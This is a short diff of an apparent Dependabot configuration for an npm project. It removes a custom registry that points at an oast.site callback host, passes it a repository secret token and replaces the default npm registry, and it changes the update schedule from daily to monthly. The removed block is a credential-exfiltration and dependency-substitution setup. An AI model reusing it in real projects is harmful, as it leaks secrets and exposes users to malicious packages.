@@ -1,14 +1,6 @@
 version: 2
-registries:
-  npmoob:
-    type: npm-registry
-    url: https://d954ckpkoqgn587dca1g9q8drysytgn7y.oast.site
-    token: ${{secrets.NPM_OOB_TOKEN}}
-    replaces-base: true
 updates:
   - package-ecosystem: npm
     directory: "/"
     schedule:
-      interval: daily
-    registries:
-      - npmoob
+      interval: monthly
